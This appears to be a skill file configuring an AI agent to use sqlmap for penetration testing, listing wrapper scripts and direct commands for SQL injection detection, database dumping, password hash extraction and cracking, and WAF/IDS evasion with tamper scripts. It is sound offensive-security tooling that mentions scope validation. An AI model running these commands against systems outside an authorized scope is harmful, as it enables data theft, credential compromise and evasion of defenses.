---
name: sqlmap
description: >-
  Detect SQL injection and extract databases with sqlmap. Parameter testing,
  WAF bypass, database enumeration, tamper scripts.
disable-model-invocation: true
---

# SQLMap SQL Injection Tool

Detect SQL injection vulnerabilities and extract databases using sqlmap.

## Tool Status

- Tool installed: !`command -v sqlmap > /dev/null 2>&1 && echo "YES -- $(sqlmap --version 2>/dev/null | head -1)" || echo "NO -- Install: brew install sqlmap (macOS) | apt install sqlmap (Debian/Ubuntu)"`
- Wrapper scripts available: !`test -f scripts/sqlmap/test-all-parameters.sh && echo "YES -- use wrapper scripts for structured JSON output" || echo "NO -- using standalone mode with direct commands"`

## Mode: Wrapper Scripts Available

If wrapper scripts are available (shown as YES above), prefer these commands.
They provide structured JSON output and educational context.

### Database Extraction
- `bash scripts/sqlmap/dump-database.sh <target-url> -j -x` -- Enumerate and extract database contents via SQL injection

### Parameter Testing
- `bash scripts/sqlmap/test-all-parameters.sh <target-url> -j -x` -- Test all parameters in an HTTP request for SQL injection

### WAF Bypass
- `bash scripts/sqlmap/bypass-waf.sh <target-url> -j -x` -- Use tamper scripts and techniques to evade WAF/IDS detection

### Learning Mode
- `bash scripts/sqlmap/examples.sh <target-url>` -- 10 common sqlmap patterns with explanations

Always add `-j` for JSON output and `-x` to execute (vs display-only).

## Mode: Standalone (Direct Commands)

If wrapper scripts are NOT available, use these direct sqlmap commands.

### Basic Injection Testing

Test URL parameters for SQL injection. The `--batch` flag auto-accepts defaults
for non-interactive use. Start simple, then escalate.

- `sqlmap -u "http://<target>/page?id=1" --batch` -- Test single parameter for SQLi
- `sqlmap -u "http://<target>/page?id=1" --forms --batch` -- Auto-detect and test form parameters
- `sqlmap -u "http://<target>/page?id=1" --crawl=2 --batch` -- Crawl site and test found parameters
- `sqlmap -u "http://<target>/page?id=1" --level=5 --risk=3 --batch` -- Maximum detection sensitivity

### Database Enumeration and Extraction

Once injection is confirmed, enumerate databases, tables, and columns. Then
dump specific data. Always enumerate before dumping to avoid pulling everything.

- `sqlmap -u "http://<target>/page?id=1" --dbs --batch` -- List all databases
- `sqlmap -u "http://<target>/page?id=1" -D <db> --tables --batch` -- List tables in database
- `sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --columns --batch` -- List columns
- `sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --dump --batch` -- Dump table contents
- `sqlmap -u "http://<target>/page?id=1" --passwords --batch` -- Extract and crack password hashes

### WAF Bypass and Evasion

Tamper scripts modify payloads to evade Web Application Firewalls and IDS.
Combine multiple tamper scripts for better evasion.

- `sqlmap -u "http://<target>/page?id=1" --tamper=space2comment --batch` -- Replace spaces with comments
- `sqlmap -u "http://<target>/page?id=1" --random-agent --batch` -- Randomize User-Agent header
- `sqlmap -u "http://<target>/page?id=1" --tamper=between,randomcase --random-agent --batch` -- Combined evasion
- `sqlmap -u "http://<target>/page?id=1" --delay=2 --batch` -- Add delay between requests

## Defaults

- Target should be a URL with injectable parameters
- `--batch` flag is recommended for non-interactive execution

## Target Validation

All commands validate targets against `.pentest/scope.json` via the PreToolUse hook.
